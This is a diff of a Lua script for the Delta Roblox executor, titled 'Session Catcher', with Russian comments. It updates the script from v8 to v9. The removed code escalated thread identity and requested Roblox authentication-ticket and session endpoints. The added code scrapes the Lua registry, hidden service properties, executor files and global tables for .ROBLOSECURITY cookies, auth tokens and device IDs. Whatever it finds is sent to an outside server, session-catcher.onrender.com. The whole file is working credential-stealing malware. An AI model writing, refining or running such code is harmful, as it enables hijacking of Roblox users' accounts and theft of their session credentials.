@@ -1,6 +1,6 @@
 -- ============================================================
 --  Session Catcher — Delta Executor (Android)
---  v8 — setidentity + game:HttpPost to auth endpoint
+--  v9 — final memory scrape: deep getreg, hidden props, pibble
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -14,134 +14,159 @@ local LocalPlayer = Players.LocalPlayer
 local results = {}
 
 -- -----------------------------------------------------------
--- 1. Проверяем текущий identity
+-- 1. Глубокий скан getreg на разные паттерны
 -- -----------------------------------------------------------
-results.currentIdentity = "N/A"
+local regMatches = {}
 pcall(function()
-    if getidentity then results.currentIdentity = tostring(getidentity()) end
-end)
-
--- -----------------------------------------------------------
--- 2. Повышаем identity до 7 (уровень CoreScript)
--- -----------------------------------------------------------
-pcall(function() if setidentity then setidentity(7) end end)
-pcall(function() if setthreadidentity then setthreadidentity(7) end end)
-pcall(function() if setthreadcontext then setthreadcontext(7) end end)
-pcall(function() if set_thread_identity then set_thread_identity(7) end end)
-pcall(function() if set_thread_context then set_thread_context(7) end end)
-
-task.wait(0.5)
-
-results.newIdentity = "N/A"
-pcall(function()
-    if getidentity then results.newIdentity = tostring(getidentity()) end
-end)
-
--- -----------------------------------------------------------
--- 3. game:HttpPost к auth endpoint (теперь с identity 7)
--- -----------------------------------------------------------
-pcall(function()
-    local ok, resp = pcall(function()
-        return game:HttpPost("https://auth.roblox.com/v1/authentication-ticket", "", "application/json")
-    end)
-    results.postAuth_ok = tostring(ok)
-    results.postAuth_value = tostring(resp):sub(1, 1000)
-end)
-
-task.wait(1)
-
--- -----------------------------------------------------------
--- 4. game:HttpGet к auth endpoint (с identity 7)
--- -----------------------------------------------------------
-pcall(function()
-    local ok, resp = pcall(function()
-        return game:HttpGet("https://auth.roblox.com/v1/authentication-ticket")
-    end)
-    results.getAuth_ok = tostring(ok)
-    results.getAuth_value = tostring(resp):sub(1, 1000)
-end)
-
-task.wait(1)
-
--- -----------------------------------------------------------
--- 5. httppost с правильным синтаксисом (Instance first)
--- -----------------------------------------------------------
-pcall(function()
-    local ok, resp = pcall(httppost, game, "https://auth.roblox.com/v1/authentication-ticket", "")
-    results.httppostAuth_ok = tostring(ok)
-    results.httppostAuth_value = tostring(resp):sub(1, 1000)
-end)
-
-task.wait(1)
-
--- -----------------------------------------------------------
--- 6. game:HttpGet на другие auth endpoints
--- -----------------------------------------------------------
-local extraEndpoints = {
-    "https://www.roblox.com/api/users/validate",
-    "https://www.roblox.com/my/settings/json",
-    "https://www.roblox.com/login/get-session-data",
-    "https://auth.roblox.com/v1/user/session",
-    "https://auth.roblox.com/v1/sessions"
-}
-
-for _, url in ipairs(extraEndpoints) do
-    pcall(function()
-        local ok, resp = pcall(function()
-            return game:HttpGet(url)
-        end)
-        local key = url:gsub("https://", ""):gsub("/", "_"):gsub("%.", "_")
-        results["get_" .. key .. "_ok"] = tostring(ok)
-        results["get_" .. key .. "_value"] = tostring(resp):sub(1, 500)
-    end)
-    task.wait(0.3)
-end
-
--- -----------------------------------------------------------
--- 7. getupvalues на request функцию — может кука в upvalue
--- -----------------------------------------------------------
-pcall(function()
-    if getupvalues then
-        local upvals = getupvalues(request)
-        if upvals then
-            local upvalDump = {}
-            for i, v in pairs(upvals) do
-                if type(v) == "string" then
-                    if v:find("_|WARNING") or v:find("ROBLOSECURITY") then
-                        upvalDump["UPVAL_COOKIE_" .. tostring(i)] = v:sub(1, 500)
-                    else
-                        upvalDump[tostring(i)] = v:sub(1, 100)
+    if getreg then
+        local reg = getreg()
+        for i, v in pairs(reg) do
+            if type(v) == "string" then
+                -- Ищем куку или её части
+                if v:find("|_") or v:find("RBXID") or v:find("auth_token") 
+                   or v:find("session") or v:find("ROBLOSECURITY") then
+                    table.insert(regMatches, "REG_STR[" .. tostring(i) .. "]: " .. v:sub(1, 300))
+                end
+            elseif type(v) == "table" then
+                for k2, v2 in pairs(v) do
+                    if type(v2) == "string" then
+                        if v2:find("|_") or v2:find("RBXID") or v2:find("auth_token") 
+                           or v2:find("ROBLOSECURITY") then
+                            table.insert(regMatches, "REG_TBL[" .. tostring(i) .. "][" .. tostring(k2) .. "]: " .. v2:sub(1, 300))
+                        end
+                    elseif type(v2) == "table" then
+                        for k3, v3 in pairs(v2) do
+                            if type(v3) == "string" then
+                                if v3:find("|_") or v3:find("ROBLOSECURITY") then
+                                    table.insert(regMatches, "REG_TBL3[" .. tostring(i) .. "][" .. tostring(k2) .. "][" .. tostring(k3) .. "]: " .. v3:sub(1, 300))
+                                end
+                            end
+                        end
                     end
-                else
-                    upvalDump[tostring(i)] = type(v) .. ":" .. tostring(v):sub(1, 100)
                 end
             end
-            results.requestUpvalues = upvalDump
         end
     end
 end)
+results.regMatches = regMatches
 
 -- -----------------------------------------------------------
--- 8. getsenv на HttpService
+-- 2. gethiddenproperty на разные сервисы
 -- -----------------------------------------------------------
+local hiddenProps = {}
 pcall(function()
-    if getsenv then
-        local senv = getsenv(game:GetService("HttpService"))
-        if senv then
-            local senvDump = {}
-            for k, v in pairs(senv) do
-                local kStr = tostring(k)
-                local vStr = tostring(v)
-                if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") or vStr:find("cookie") then
-                    senvDump[kStr] = "COOKIE: " .. vStr:sub(1, 500)
-                else
-                    senvDump[kStr] = type(v) .. ":" .. vStr:sub(1, 100)
-                end
+    local services = {
+        game:GetService("Players"),
+        game:GetService("NetworkClient"),
+        game:GetService("ReplicatedFirst"),
+        game:GetService("RbxAnalyticsService"),
+        game:GetService("PlatformUserService"),
+        game:GetService("DataStoreService"),
+        game
+    }
+    
+    local propNames = {
+        "RobloxSecurity", "ROBLOSECURITY", "Cookie", "AuthToken",
+        "SessionToken", "SecurityToken", "AuthenticationToken",
+        "Ticket", "AccessToken", "ClientTicket", "AuthTicket",
+        "MachineId", "ClientID", "DeviceID", "TrackerId"
+    }
+    
+    for _, svc in ipairs(services) do
+        for _, prop in ipairs(propNames) do
+            local ok, val = pcall(gethiddenproperty, svc, prop)
+            if ok and val and type(val) == "string" and #val > 10 then
+                hiddenProps[tostring(svc) .. "." .. prop] = val:sub(1, 500)
             end
-            results.httpServiceSenv = senvDump
         end
     end
 end)
+results.hiddenProps = hiddenProps
+
+-- -----------------------------------------------------------
+-- 3. getsafedir + listfiles + readfile
+-- -----------------------------------------------------------
+local safeDirInfo = {}
+pcall(function()
+    local sd = getsafedir and getsafedir() or ""
+    safeDirInfo.path = sd
+    if sd and sd ~= "" and listfiles then
+        local files = listfiles(sd)
+        safeDirInfo.fileCount = #files
+        safeDirInfo.files = {}
+        for _, f in ipairs(files) do
+            local ok, content = pcall(readfile, f)
+            if ok and content then
+                safeDirInfo.files[f] = content:sub(1, 300)
+            end
+        end
+    end
+end)
+results.safeDirInfo = safeDirInfo
+
+-- -----------------------------------------------------------
+-- 4. pibble.getpibbles — безопасный дамп
+-- -----------------------------------------------------------
+local pibbleDump = {}
+pcall(function()
+    local genv = getgenv()
+    local pbl = genv and genv.pibble
+    if pbl and pbl.getpibbles then
+        local ok, tbl = pcall(pbl.getpibbles)
+        if ok and type(tbl) == "table" then
+            for k, v in pairs(tbl) do
+                if type(v) == "string" or type(v) == "number" or type(v) == "boolean" then
+                    pibbleDump[tostring(k)] = tostring(v):sub(1, 500)
+                elseif type(v) == "table" then
+                    local sub = {}
+                    for k2, v2 in pairs(v) do
+                        sub[tostring(k2)] = tostring(v2):sub(1, 200)
+                    end
+                    pibbleDump[tostring(k)] = sub
+                else
+                    pibbleDump[tostring(k)] = type(v)
+                end
+            end
+        else
+            pibbleDump.error = "getpibbles returned " .. type(tbl)
+        end
+    end
+end)
+results.pibbleDump = pibbleDump
+
+-- -----------------------------------------------------------
+-- 5. Crypt table — есть ли там кука
+-- -----------------------------------------------------------
+local cryptInfo = {}
+pcall(function()
+    local genv = getgenv()
+    if genv and genv.crypt then
+        for k, v in pairs(genv.crypt) do
+            cryptInfo[tostring(k)] = type(v)
+        end
+    end
+end)
+results.cryptInfo = cryptInfo
+
+-- -----------------------------------------------------------
+-- 6. Cache table
+-- -----------------------------------------------------------
+local cacheInfo = {}
+pcall(function()
+    local genv = getgenv()
+    if genv and genv.cache then
+        for k, v in pairs(genv.cache) do
+            cacheInfo[tostring(k)] = type(v)
+        end
+        -- Если cache содержит куки
+        for k, v in pairs(genv.cache) do
+            if type(v) == "string" and (v:find("ROBLOSECURITY") or v:find("|_")) then
+                cacheInfo["COOKIE_FOUND"] = v:sub(1, 500)
+            end
+        end
+    end
+end)
+results.cacheInfo = cacheInfo
 
 -- -----------------------------------------------------------
 -- Отправка
@@ -162,4 +187,4 @@ pcall(function()
     })
 end)
 
-print("[Catcher] v8 identity probe sent")
+print("[Catcher] v9 final scrape sent")
